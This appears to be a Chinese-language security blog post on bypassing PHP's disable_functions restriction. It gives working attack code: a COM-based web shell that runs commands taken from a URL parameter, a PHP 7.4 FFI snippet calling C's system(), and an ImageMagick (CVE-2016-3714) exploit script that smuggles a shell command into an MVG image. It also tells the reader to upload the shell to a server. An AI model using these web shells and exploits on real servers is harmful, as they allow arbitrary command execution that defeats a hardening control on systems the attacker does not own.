Bypass_disable_functions

2019年09月10日 835 字 大概 4 分钟 Bypass

PHP中的 disable_functions 用来禁用一些危险的函数来避免被攻击者利用，于是我们要做的就是如何Bypass

https://hackmd.io/s/Hk-8h0VIB

Disable_functions

一般有以下一些函数会被放入disable_functions中：

  1. exec()
  2. system()
  3. chroot()
  4. chown()
  5. shell_exec()
  6. proc_open()
  7. popen()
  8. dl()
  9. passthru()
  10. ……

    绕过方法

利用Windows系统组件COM绕过

参考：https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x03-%E5%88%A9%E7%94%A8Windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6COM%E7%BB%95%E8%BF%87
上传comshell.php到服务器：

<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>

创建一个COM对象，然后通过调用exec()方法来实现执行系统命令，从而绕过

利用PHP 7.4 FFI绕过

参考：https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/
FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。也就是说，通过PHP调用C的命令执行函数来绕过。
下面是一个简单的使用Demo，调用system()函数

<?php
$ffi = FFI::cdef("int system (const char* command);");
$ffi->system("ls");
?>

FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可

ImageMagick 漏洞绕过

参考：https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html

https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。

主要原理

ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的！！
图片的属性会被%i和%l等占位符被拼接在命令行中，之后被拼接的语句会被system函数执行，而我们只需要使用反引号或者闭合双引号来实现任意命令执行

Bypass

exp：

<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";
//用参数传递命令
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}
//将命令包含入图片内容
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;
//生成图片
file_put_contents("KKKK.mvg", $exploit);
//调用模块处理图片来运行命令
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
